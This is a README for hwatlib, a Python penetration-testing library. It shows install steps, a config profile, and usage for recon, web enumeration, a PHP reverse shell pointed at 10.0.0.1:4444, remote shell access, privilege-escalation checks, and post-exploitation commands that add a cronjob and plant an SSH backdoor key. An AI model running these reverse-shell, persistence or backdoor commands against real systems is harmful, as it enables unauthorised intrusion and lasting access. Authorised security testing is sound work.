# hwatlib

A practical pentesting and exploitation library with wrappers for recon, web enumeration, reverse shells, and privilege escalation.

---

To install, run:

```bash
pip3 install hwatlib
```

## Local Development

From the repository root:

```bash
pip3 install -e .
```

## Basic Usage

```python3
from hwatlib import exploit, privesc, recon, web

# Recon example
recon.init("example.com", add_to_hosts=True)
recon.nmap_scan()
recon.banner_grab()

# Web enumeration
web.fetch_all("http://example.com")

# Exploit (reverse shell)
exploit.php_reverse_shell("10.0.0.1", 4444)
```

## Privilege Escalation

```python3
from hwatlib import privesc

# Run various local privesc checks
privesc.run_checks()
privesc.enumerate_sudo()
privesc.enumerate_cron()
privesc.kernel_exploits()
```

## Custom IO / Remote Exploitation

```python3
from hwatlib import exploit

# Connect to remote host
remote = exploit.connect_remote("10.0.0.1", 31337)
remote.run_shell("bash")
```

## Web Exploitation

```python3
from hwatlib import web

# Fetchers and enumeration
web.fetch_headers("http://example.com")
web.fetch_forms("http://example.com/login")
web.fetch_js("http://example.com")

```

## CLI

After installation, these commands are available:

```bash
hwat report <target>
hwat-recon <target>
hwat-web <url>
hwat-exploit <ip> <port>
hwat-post

# State-changing actions are gated behind --confirm
hwat-post add-cronjob "id" --schedule "*/5 * * * *" --confirm
hwat-post backdoor-ssh "ssh-ed25519 AAAA..." --confirm
```

### Unified Report CLI

Generate a read-only report (JSON printed to stdout by default):

```bash
hwat report example.com
```

Write report outputs:

```bash
hwat report example.com --out-json report.json --out-md report.md
```

Sitemap export:

```bash
hwat report https://example.com --sitemap-json sitemap.json --sitemap-csv sitemap.csv
```

Plugins:

```bash
hwat report example.com --list-plugins
hwat report example.com --plugin mypkg.mychecks:check
```

### Config / Profiles

By default, hwatlib looks for `~/.config/hwat/config.toml`.

Example:

```toml
[profiles.default.http]
timeout = 7.5
verify = true
rate_limit_per_sec = 2.0

[profiles.default.http.proxies]
http = "http://127.0.0.1:8080"
https = "http://127.0.0.1:8080"

[profiles.default.http.headers]
User-Agent = "hwatlib"
```

Select a profile:

```bash
hwat report example.com --profile default
```

Hwatlib is under continuous development and more features for pentesting, recon, exploitation, and post-exploitation will be added.

## Safer Defaults

- HTTPS requests verify TLS certificates by default. If you *explicitly* need to disable verification, pass `verify=False` (and optionally `suppress_insecure_warning=True`) to `hwatlib.utils.fetch_url()`.
- State-changing post-exploitation helpers require explicit confirmation. For example, use `postex.add_cronjob_confirmed(..., confirm=True)` or `postex.backdoor_ssh_confirmed(..., confirm=True)`.
